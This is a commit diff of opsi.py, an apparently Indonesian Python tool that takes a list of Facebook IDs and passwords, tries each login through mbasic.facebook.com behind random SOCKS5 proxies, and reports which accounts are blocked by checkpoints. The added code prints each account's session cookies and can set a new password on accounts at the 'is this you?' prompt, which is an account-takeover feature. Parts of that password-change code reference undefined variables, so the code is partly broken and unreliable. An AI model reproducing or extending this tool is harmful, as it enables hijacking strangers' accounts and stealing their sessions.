d594d4190bce3d3c4fef3fc44f8195040adf6eb5
RochmatBasukiXD <103634965+RozhBasXYZ@users.noreply.github.com>
2022-06-24 20:18:01 +0700

    Update opsi.py

--- opsi.py
+++ opsi.py
@@ -1,17 +1,28 @@
 import requests,re,bs4,sys,os,time,random
-session = requests.Session()
-from bs4 import BeautifulSoup as sop
+from bs4 import BeautifulSoup as parser
+ses = requests.Session()
+
+###---[ FITUR APPEND ]--###
+ubah,pwbaru,pro = [],[],[]
+lopi,slh,cp,tp,ggl = 0,0,0,0,0
+
+###---[ WARNA ]--###
 J = '\x1b[38;5;208m'
-hh = '\033[32m' # HIJAU -
 k = '\033[93m'
-opsi,pro = [],[]
 P = "\033[0m"
+M = "\033[91m"
+P = "\033[0m"
+hh = "\033[32m"
+
+###---[ USERAGENT ]--###
 try:ua = open('.usergetbas.txt','r').read()
-except:ua = "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"
+except:ua = "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 3S Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.85 Mobile Safari/537.36"
 
-
+###---[ CLEAR ]--###
 def hilang():
 	os.system('clear')
+
+###---[ LOGO/BANNER ]--###
 def logo():
 	print(f"""          __           __              
      ____/ /  ___ ____/ /__            ┌──────────────────────────────┐  
@@ -20,6 +31,8 @@ def logo():
               / _ \/ _ \/ / _ \/ __/   └──────────────────────────────┘
              / .__/\___/_/_//_/\__/    
             /_/                        \n\n""")
+
+###---[ MENU UTAMA ]--###
 def menu():
 	hilang()
 	logo()
@@ -36,11 +49,13 @@ def menu():
 	else:
 		exit()
 
+###---[ INFO PEMAKAIAN ]--###
 def info():
 	hilang()
 	logo()
 	print("""1. cek opsi checkpoint\n dalam menu ini ada 3 pertanyaan sebelum anda melakukan cek opsi\n - cara memasukan nama file adalah /sdcard/namafile\n   atau /sdcard/namafolder/namafile\n - pemisah file adalah pemisah di antara\n   user id dan sandi contoh (100002888888 • sandimu)\n   sebaiknya cek terlebih dahulu file anda memakai pemisah jenis apa\n\n2. setting user agent\n dalam menu ini ada dua pilihan cek user agent\n yang terpakai di dalam sc atau ganti user agent\n - cara ganti user agent sesuai merk hp anda adalah\n   dengan cara mencari di google (my user agent) lalu yang muncul\n   di bar pertama adalah user agent hp anda coopy dan masukan ke sc\n\n3. setting proxy\n dalam menu ini ada 2 pilihan\n - pilihan ke satu adalah memakai proxy indonesia\n - pilihan ke dua adalah memakai proxy luar negeri""")
 
+###---[ SETTING USERAGENT ]--###
 def userget():
 	to = input("1. cek user agent\n2. ganti user agent\nmenu : ")
 	if to in ['1']:
@@ -52,22 +67,27 @@ def userget():
 	try:os.remove('.usergetbas.txt')
 	except:pass
 	open('.usergetbas.txt','w').write(ugt)
-	exit("sukses setting user agent\nuser agent : %s%s%s"%(hh,ugt,P))
+	print("sukses setting user agent\nuser agent : %s%s%s\nenter untuk kembali"%(hh,ugt,P))
+	input("")
+	menu()
 
+###---[ SETTING PROXY ]--###
 def prox():
 	wow = input("1. random proxy indonesia\n2. random proxy luar negeri\nmenu : ")
 	if wow in ['1']:
-		sock = session.get('https://api.proxyscrape.com/?request=displayproxies&protocol=socks4&timeout=100000000&country=ID&ssl=ID&anonymity=ID').text
+		sock = session.get('https://api.proxyscrape.com/?request=displayproxies&protocol=socks5&timeout=100000000&country=ID&ssl=ID&anonymity=ID').text
 		open('.prox.txt','w').write(sock)
 		print(sock,"\nberhasil setting proxy indonesia")
 		exit()
 	else:pass
-	sock2 = session.get('https://api.proxyscrape.com/?request=displayproxies&protocol=socks4&timeout=100000000&country=all&ssl=all&anonymity=all').text
+	sock2 = session.get('https://api.proxyscrape.com/?request=displayproxies&protocol=socks5&timeout=100000000&country=all&ssl=all&anonymity=all').text
 	open('.prox.txt','w').write(sock2)
 	print(sock2,"\nberhasil setting proxy luar negeri")
 	exit()
 
+###---[ OPEN FILE ]--###
 def main():
+	global lopi,slh,cp,tp,ggl
 	ba = input("nama file : ")
 	try:data = open(ba,"r").readlines()
 	except FileNotFoundError:exit("file tidak ada")
@@ -76,91 +96,111 @@ def main():
 	if proc in ['y','Y']:
 		pro.append("y")
 	else:pass
-	print(f"jumlah akun di file %s adalah %s"%(ba,len(data)))
-	input(f"di anjutkan mode pesawat selama 3 detik, enter jika sudah.")
+	pwn = input("ubah sandi tap yes [y/t] : ")
+	if pwn in ["y","Y"]:
+		ubah.append("y")
+		new = input("sandi baru : ")
+		if len(new) <= 5:
+			print("sandi minimal 6 huruf")
+			new = input("sandi baru : ")
+		pwbaru.append(new)
+	else:pass
+	print(f"jumlah akun di file {k}%s {P}adalah {k}%s{P}\n[{k}•{P}]\n{M} |{P}"%(ba,len(data)))
 	babaz(pm,data)
 	
-
-def sesi(session,res):
-	response = sop(res,'html.parser')
-	form = response.find('form',{'method':'post'})
-	data = {x.get('name'):x.get('value') for x in form.find_all('input',{'type':['hidden','submit']})}
-	r = sop(session.post('https://m.facebook.com'+form.get('action'),data=data).text, 'html.parser')
-	for i in r.find_all('option'):
-		opsi.append(i.text)
-	return opsi
-
+	
+###---[ GET OPSI ]--###
 def babaz(pm,data):
-	lopi,slh,cp,tp = 0,0,0,0
+	global lopi,slh,cp,tp,ggl
+	try:prox = open('.prox.txt','r').read().splitlines()
+	except:prox = ["101.36.107.134:65005","103.120.39.104:5678","1.32.59.217:47045","1.179.147.5:52210","102.223.49.74:8080","102.141.197.17:8080","102.176.228.45:4145"]
+	proxy = {'http': 'socks5://'+random.choice(prox)}			
 	for user in data:
-		try:
-			try:prox = open('.prox.txt','r').read().splitlines()
-			except:prox = ["182.253.197.70:8080","202.165.38.61:5678","113.11.136.28:30993","103.18.77.233:8080"]
-			proxy = {'http': 'socks4://'+random.choice(prox)}
-			try:idf,pw = user.split(f"{pm}")
-			except:print(f"{k}pemisah file salah {user}\33[m");exit()			
-			h2 = {'host':'mbasic.facebook.com','accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','accept-encoding':'gzip, deflate','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7','cache-control':'max-age=0','origin':'https://www.facebook.com','referer':'https://www.facebook.com','sec-ch-ua':'" Not A;Brand";v="99", "Chromium";v="101"','upgrade-insecure-requests':'1','user-agent':ua}
-			res = session.get('https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8',headers = h2,).text
-			ress = sop(res, 'html.parser')
-			form = ress.find('form',{'method':'post'})
-			data2 = {x.get('name'):x.get('value') for x in form.find_all('input',{'type':['submit','hidden']})}
-			data2.update({
-					'email':idf,
-					'pass':pw})
-			if 'y' in pro:
-				res = session.post('https://mbasic.facebook.com'+form.get('action'),data=data2,proxies=proxy,headers=h2).text
-			else:pass
-			res = session.post('https://mbasic.facebook.com'+form.get('action'),data=data2,headers=h2).text
-			ress = sop(res, 'html.parser')
-			if 'Lihat detail login yang ditampilkan. Ini Anda?' in str(ress.find('title').text):
-				print(f"""\r{P}────────────────────            
-\remail : {hh}{idf}{P}
-\rsandi : {hh}{pw}{P}opsi  : {hh}akun tap yes{P}
-\r────────────────────\n""")
-				tp+=1
-			elif 'Daftar Facebook' in str(ress.find('title').text):
-				slh+=1
-				print(f"""\r{P}────────────────────              
-\remail : \033[93m{idf}{P}
-\rsandi : \033[93m{pw}{P}opsi  : \033[93mkata sandi salah/terjadi kesalahan{P}
-\r────────────────────\n""")
+		try:idf,pw = user.split(pm)
+		except ValueError:exit("pemisah salah, file anda memakai pemisah "+user)
+		print(f"{M} |{P}\n[{k}•{P}]\nmencoba login ke\nemail : {k}{idf}\n{P}sandi : {k}{pw}{P}",end=' ')
+		ses.headers.update({"Host":"mbasic.facebook.com","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9","referer":"https://mbasic.facebook.com/","user-agent":ua})
+		if "y" in pro:
+			soup=parser(ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8",proxies=proxy).text,"html.parser")
+		else:
+			soup=parser(ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
+		link=soup.find("form",{"method":"post"})
+		data,data2 = {},{}
+		data_ubah,data_ubah2 = {},{}
+		for x in soup("input"):
+			data.update({x.get("name"):x.get("value")})
+		data.update({"email":idf,"pass":pw})
+		url=ses.post("https://mbasic.facebook.com"+link.get("action"),data=data)
+		response=parser(url.text, "html.parser")
+		if "c_user" in ses.cookies.get_dict():
+			if "Akun Anda Dikunci" in url.text:
+				print(f"[{k}•{P}] {k}akun terkena sesi new{P}")
+				cp+=1
 			else:
-				if(len(sesi(session,res))==0):
-					if 'Masukkan Kode Masuk untuk Melanjutkan' in str(ress.find('title').text):
-						print(f"""\r{P}────────────────────           
-\remail : \033[93m{idf}{P}
-\rsandi : \033[93m{pw}{P}opsi  : \033[93mterpasang auten{P}
-\r────────────────────\n""")
-					elif 'c_user' in str(ress.find('title').text):
-						if 'Akun Anda Dikunci' in str(ress.find('title').text):
-							print(f"""\r{P}────────────────────           
-\remail : \033[93m{idf}{P}
-\rsandi : \033[93m{pw}{P}opsi  : \033[93makun sesi new{P}
-\r────────────────────\n""")
-						else:
-							print(f"""\r{P}────────────────────          
-\remail : {hh}{idf}{P}
-\rsandi : {hh}{pw}{P}opsi  : {hh}akun tidak checkpoint{P}
-\r────────────────────\n""")
-				else:
+				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items()])
+				print(f"[{hh}•{P}] {hh}akun tidak checkpoint{P}")
+				tp+=1
+		elif "checkpoint" in ses.cookies.get_dict():
+			cp+=1
+			coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items()])
+			title=re.findall("\<title>(.*?)<\/title>",str(response))
+			link2=response.find("form",{"method":"post"})
+			listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
+			for x in response("input"):
+				if x.get("name") in listInput:
+					data2.update({x.get("name"):x.get("value")})
+			try:an=ses.post("https://mbasic.facebook.com"+link2.get("action"),data=data2)
+			except:time.sleep(1)
+			response2=parser(an.text,"html.parser")
+			cek=[cek.text for cek in response2.find_all("option")]
+			number=0
+			print(f"{P}\rterdapat {str(len(cek))} opsi : ")
+			if(len(cek)==0):
+				if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
+					tp+=1
+					if "y" in ubah:
+						but=["submit[Yes]","nh","fb_dtsg","jazoest","checkpoint_data"]
+						for x in response("input"):
+							if x.get("name") in but:
+								data_ubah.update({x.get("name"):x.get("value")})
+						newpw=ses.post("https://mbasic.facebook.com"+link2.get("action"),data=data_ubah).text
+						url_ubahpw=parser(newpw.text,"html.parser")
+						get2=ubahPw.find("form",{"method":"post"})
+						submit2=["submit[Next]","nh","fb_dtsg","jazoest"]
+						if "Buat Kata Sandi Baru" in re.findall("\<title>(.*?)<\/title>",str(url_ubahpw)):
+							for b in url_ubahpw("input"):
+								data2.update({b.get("name"):b.get("value")})
+							data_ubah2.update({"password_new":"".join(pwbaru)})
+							po=ses.post("https://mbasic.facebook.com"+get2.get("action"),data=data2)
+							coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+							print(f"{hh}akun tap yes, sedang ganti sandi {P}")
+							time.sleep(2)
+							print(f"\remail : {hh}{idf}                    {P}\nsandi : {hh}{pwbaru[0]}\n{P}cookie : {hh}{coki}  {P}              ")
+							print(f"{M} |{P}")
+					else:
+						coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items()])
+						print(f"\r{hh}akun tapyes silahlan login ke mbasic{P}")
+				elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response)):
+					print(f"\r[{k}•{P}] {k}akun telah terpasang auten{P}")
+					print(f"{M} |{P}")
 					cp+=1
-					print(f"""\r{P}────────────────────             
-\remail : \033[93m{idf}{P}
-\rsandi : \033[93m{pw}{P}opsi  : \033[93m%s
-\r{P}────────────────────\n"""%('\n       '.join(opsi)))
-			lopi+=1		
-			opsi.clear()
-			print("\r%s/%s - %s"%(lopi,len(data),idf),end=' ')
-			sys.stdout.flush()
-		except requests.exceptions.ConnectionError:
-			pass
-		except Exception as e:
-			print(f"""\r{P}────────────────────
-\remail : \033[93m{idf}{P}
-\rsandi : \033[93m{pw}{P}opsi  : \033[93m{e}{P}
-\r────────────────────\n""")
-	print(f"\rproses cek selesai             \njumlah tap yes : %s\njumlah checkpoint : %s\njumlah salah sandi : %s"%(tp,cp,slh))
-	exit()
+				else:
+						for y in re.findall("\<title>(.*?)<\/title>",str(response)):
+							print(f"\r[{k}•{P}] {k}{y}{P}")
+						print(f"{M} |{P}")
+						ggl+=1
+			else:
+				number +=1
+				cp+=1
+				for mek in cek:
+					print(f"\r[{k}{str(number)}{P}]. {k}{mek}                      {P}")
+				print(f"{M} |{P}")
+		else:
+			print(f"\r[{k}•{P}] {k}kata sandi salah, atau telah di ubah{P}")
+			print(f"{M} |{P}")
+			slh+=1
+	print(f"{M} |{P}")
+	exit(f"[{k}•{P}] sukses deteksi checkpoint\nakun salah sandi : %s\nakun gagal login : %s\nakun tap yes/ok  : %s\nakun checkpoint  : %s"%(slh,ggl,tp,cp))
 
 
 if __name__=="__main__":
